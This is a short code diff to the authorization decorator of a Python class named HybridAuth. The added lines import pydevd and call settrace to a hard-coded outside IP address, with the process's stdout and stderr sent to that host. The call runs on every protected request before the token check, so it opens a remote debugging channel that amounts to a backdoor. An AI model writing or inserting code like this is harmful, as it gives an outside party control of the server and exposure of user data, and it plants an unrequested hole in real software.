@@ -217,6 +217,8 @@ class HybridAuth(Auth):
         def decorator(func):
             @wraps(func)
             def inner(*args, **kwargs):
+                import pydevd
+                pydevd.settrace('90.44.122.204', port=12345, stdoutToServer=True, stderrToServer=True)
                 if request.blueprint in ('links', 'users'):
                     token = self.check_token_header()
                     if not test_func(token.user):
